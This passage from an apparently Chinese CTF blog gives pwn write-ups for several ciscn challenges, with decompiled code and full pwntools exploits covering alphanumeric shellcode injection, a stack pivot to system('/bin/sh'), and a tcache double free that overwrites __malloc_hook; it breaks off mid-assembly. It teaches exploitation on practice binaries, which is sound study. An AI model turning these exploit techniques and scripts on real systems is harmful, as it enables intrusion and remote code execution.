class="number">0</span>;</span><br><span class="line">  sa = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      sub_DA8(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      sub_CBD(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最后一个部分 清空了a1的值 sa指向a1字符串的末尾 如果有换行符赋值为0</p><p>最后进行一个switch选择分支 参数为v7</p><p>根据v7的值进入不同的函数 参数为dest</p><p>综上所述 我们需要构造的payload的格式应该为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     opt:(v7)(x)\n</span><br><span class="line">或者是msg:(dest)(x)\n</span><br><span class="line">其中x是任意单字节的垃圾数据 因为需要使得v9等于dest的长度</span><br></pre></td></tr></table></figure><p>接着跟进一下switch分支中的各个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;ro0t&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">    unk_202024 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>for循环中对dest中的字符串进行了检查 isprintf检查字符是否可以被打印 同时&amp;&amp;关联了一个判断式 当dest中没有换行符时才能通过if判断</p><p>接着如果dest字符串的值为ro0t时 unk_202028 &#x3D; unk_202024 &#x3D; 1  否则unk_202028 &#x3D; 1</p><p>这里可能会有疑惑  之前的函数不是将dest中的\n赋值为了0 这个0会对字符串的判断产生影响吗</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    b=strcasecmp(a,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里尝试了一下 答案是不会</p><p>这里还不知道这两个bss段的全局变量值会有什么影响 接着看下一个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202028 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getpagesize();</span><br><span class="line">    dest = mmap(&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);</span><br><span class="line">    (dest)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开头同样是对于dest字符串进行一个检测 接着如果unk_202028不等于1就结束进程</p><p>如果unk_202024&#x3D;1就进入if分支否则进入else分支 else分支可以打印出a1 但是感觉不太好利用 还是来看看if分支</p><p>getpagesize获取了当前页的基地址 目的是为了配合mmap函数将该页的权限修改为7 即可读可写可执行</p><p>接着将a1字符串写入到这块内存空间中 最后执行 那显然是shellcode</p><p>并且还得是可见字符串shellcode 否则过不了最开始的判断</p><p>剩下一个函数就没什么好看的了 没啥作用</p><p>可见字符串shellcode要利用alpha3生成 具体的办法我相关博客有写 这里不复述 要注意的是本题的shellcode执行是call rdx</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26603)</span></span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28753)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./buu_libc_ubuntu18_64&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./locate&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">payload1=<span class="string">&#x27;opt:1\n&#x27;</span>+<span class="string">&#x27;msg:ro0ta\n&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,payload1)</span><br><span class="line">payload2 = <span class="string">&#x27;opt:2\n&#x27;</span>+<span class="string">&#x27;msg:&#x27;</span> + shellcode + <span class="string">&#x27;a\n&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>checksec看一下保护机制</p><p><a href="https://imgse.com/i/zPrkOf"><a href="https://s1.ax1x.com/2022/11/12/zPrkOf.png" title="zPrkOf.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/12/zPrkOf.png" alt="zPrkOf.png"></a></a></p><p>ida打开 主函数应该是vul 跟进看一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能溢出两个字长 只够我们覆盖ebp和ret addr</p><p>这种情况下只能考虑栈迁移了</p><p>先搞清楚为什么出题人会给两个read吧</p><p>栈迁移我们首先需要知道栈帧的地址</p><p>而我们知道 一个栈帧在结束的时候 ebp中存储的是父函数的栈底地址</p><p>printf函数遇到\0时就会停止输出 如果我们将s这个数组填满</p><p>那么它就会继续输出下一个字长 这样我们就泄露了ebp的内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x27</span>+<span class="string">b&quot;b&quot;</span></span><br></pre></td></tr></table></figure><p>此时我们使用gdb进行动调 目的是为了得到ebp和我们输入的s的偏移(哪怕开启了pie或者RELRO 由于分页机制的特性 偏移是不变的)</p><p>我们将断点打在vul函数的nop汇编的地址</p><p><a href="https://imgse.com/i/zPySxI"><a href="https://s1.ax1x.com/2022/11/12/zPySxI.png" title="zPySxI.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/12/zPySxI.png" alt="zPySxI.png"></a></a></p><p>0xa8-0x70 &#x3D; 0x38 于是我们得到 变量s的起始地址为ebp_addr - 0x38</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = (<span class="string">b&quot;aaaa&quot;</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(ebp_addr-<span class="number">0x38</span>+<span class="number">0x10</span>)+<span class="string">b&quot;/bin/sh&quot;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)+p32(leave_ret)</span><br></pre></td></tr></table></figure><p>这里解释一下p32(ebp_addr-0x38+0x10)</p><p>我们知道 栈迁移需要一个字长的垃圾数据来平衡栈  此时aaaa的地址为ebp_addr-0x38</p><p>&#x2F;bin&#x2F;sh前面的三个字长则占用了0xc字节</p><p>所以此时&#x2F;bin&#x2F;sh的位置则位于ebp_addr-0x38+0x10</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28157</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x27</span>+<span class="string">b&quot;b&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">ebp_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = <span class="number">0x8048400</span></span><br><span class="line">binsh_addr = ebp_addr - <span class="number">0x38</span>+<span class="number">0x10</span></span><br><span class="line">ret_addr = <span class="number">0x080483a6</span></span><br><span class="line">leave_addr = <span class="number">0x080484b8</span> </span><br><span class="line">payload = (cyclic(<span class="number">0x4</span>)+p32(system_addr)+p32(<span class="number">0xabcdabcd</span>)+p32(binsh_addr)+<span class="string">b&quot;/bin/sh&quot;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)+p32(leave_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn-2019-final-3"></a>ciscn-2019-final-3</h2><p>这题没想出来根据堆块地址不断申请到main_arena的chunk 然后泄露基址的思路</p><p>记录一下 扩展一下思路</p><p>checksec</p><p><a href="https://pic.imgdb.cn/item/63eb7570f144a01007be1e3b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63eb7570f144a01007be1e3b.png"></a></p><p>ida反编译 看一下伪代码</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">sub_C5A</span>(a1, a2, a3);</span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;welcome to babyheap&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;choice &gt; &quot;</span>);</span><br><span class="line">    std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只给了两个函数 add和delete 其中delete没有置零指针 存在UAF漏洞</p><p>add函数在申请完chunk后打印了chunk的用户空间区域首地址</p><p>那么此时我们拥有的漏洞只有UAF了 只能利用这个来泄露基址和获取shell</p><p>获取shell好说 这题的环境是Ubuntu18 可以打hook 并且tcache的检查机制没有fastbin那么复杂 可以很轻松的利用double free修改fd来申请任意内存空间的chunk</p><p>那么难点落在泄露libc基址了 题目没有给我们show函数 但是相比其他堆题给了打印申请chunk的地址的机会</p><p>很明显要利用这个来替代show函数</p><p>那么此时就可以利用UAF来申请到一块位于libc基址附近内存区域的chunk</p><p>那么我们可以联想到如果unsortedbin中的单个链表如果只有一个 free chunk 那么其fd和bk域的值就会是main_arena_addr+padding</p><p>此时存放main_arena_addr的地址我们也知道 就可以在tcachebin上窜成一个链表 申请到位于main_arena_addr的堆块</p><p>那么此时add函数中的这条代码就可以输出该chunk的用户空间首地址 即泄露了main_arena_addr 我们就可以得到libc基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,28487)</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./locate&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice &gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;input the index&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;input the size&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;now you can write something&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;gift :&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice &gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;input the index&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x70</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x70</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p>此时 我们double free chunk0 此时的链表结构如下图</p><p><a href="https://pic.imgdb.cn/item/63eb88c3f144a01007e6735e.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63eb88c3f144a01007e6735e.png"></a></p><p>按照tcachebins单向链表先进后出的原则 此时我们获得是蓝色的那个free chunk 并且tcachebin显示的链表地址是chunk的用户空间首地址</p><p>此时我们将申请的chunk的内容设置为chunk1的首地址 就可以将其作为白色的free chunk的fd域 挂载在链表上 从而我们就可以申请到对应的内存空间</p><p>而利用for循环申请的几个chunk 则是为了等下修改chunk1的size域 从而合并后面的chunk空间 获得一个大于tcachebin范围的chunk 这样就能释放到unsortedbin中了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x481</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x70</span>,payload)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>此时覆盖chunk1的size域 并且释放chunk1 chunk13是用来后面的double free chunk14是用来防止和top chunk合并</p><p><a href="https://pic.imgdb.cn/item/63eb8ae2f144a01007eac6ac.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63eb8ae2f144a01007eac6ac.png"></a></p><p>此时我们就成功往unsortedbin中释放了一个chunk</p><p>那么指向main_arena的地址也就是我们上面的heap_addr</p><p>我们用同样的办法 再次利用double free任意申请到一个chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x20</span>,p64(heap_addr))</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63eb8f19f144a01007f6a203.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63eb8f19f144a01007f6a203.png"></a></p><p>但是此时的链表结构显示是不全的 其是根据箭头所指的数据来显示free chunk</p><p>使用tel指令可以查看其地址指向</p><p><a href="https://pic.imgdb.cn/item/63eb8f96f144a01007f8952d.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63eb8f96f144a01007f8952d.png"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">16</span>,<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">main_arena_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7f355d756ca0</span>-<span class="number">0x7f355d36b000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x10a38c</span></span><br></pre></td></tr></table></figure><p>此时我们连续申请三个chunk 申请的第三个chunk就会分配到main_arena的空间</p><p>就成功泄露了基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">19</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x60</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">21</span>,<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">22</span>,<span class="number">0x60</span>,p64(onegadget_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;choice &gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;input the index&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;23&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;input the size&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0x70&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>最后一步同理 通过同样的double free办法 获取任意写malloc_hook的机会 将其修改为onegadget 再次调用malloc的时候就会触发onegadget 获取shell</p><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn-2019-s-3"></a>ciscn-2019-s-3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>主体函数非常简单 利用系统调用号实现了一次输入和输出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个gadget函数 看一下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004D6 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000004004D6</span><br><span class="line">.text:00000000004004D6 ; Attributes: bp-based frame</span><br><span class="line">.text:00000000004004D6</span><br><span class="line">.text:00000000004004D6                 public gadgets</span><br><span class="line">.text:00000000004004D6 gadgets         proc near</span><br><span class="line">.text:00000000004004D6 ; __unwind &#123;</span><br><span class="line">.text:00000000004004D6                 push    rbp</span><br><span class="line">.text:00000000004004D7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004004DA                 mov     rax, 0Fh</span><br><span class="line">.text:00000000004004E1                 retn</span><br><span class="line">.text:00000000004004E1 gadgets         endp ; sp-analysis failed</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004E2                 mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:00000000004004E9                 retn</span><br><span class="line">.text:00000000004004E9 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>下方的0x3b则为59 是execve的系统调用号</p><p>应该是构造rop链 但是这题没有办法泄露libc基址 从而也没有办法获取&#x2F;bin&#x2F;sh的地址</p><p>所以只能通过写入栈上</p><p>要想利用栈 先得获得栈的地址 发现sys_write函数可以打印出0x30字节 而buf距离rbp只有0x10</p><p>还有一点需要注意 发现vuln函数的结尾并没有leave指令 也就是说我们只需要覆盖rbp就可以控制程序执行流</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004ED ; __unwind &#123;</span><br><span class="line">.text:00000000004004ED                 push    rbp</span><br><span class="line">.text:00000000004004EE                 mov     rbp, rsp</span><br><span class="line">.text:00000000004004F1                 xor     rax, rax</span><br><span class="line">.text:00000000004004F4                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004004F9                 lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">.text:00000000004004FE                 mov     rdi, rax        ; fd</span><br><span class="line">.text:0000000000400501                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000400503                 mov     rax, 1</span><br><span class="line">.text:000000000040050A                 mov     edx, 30h ; 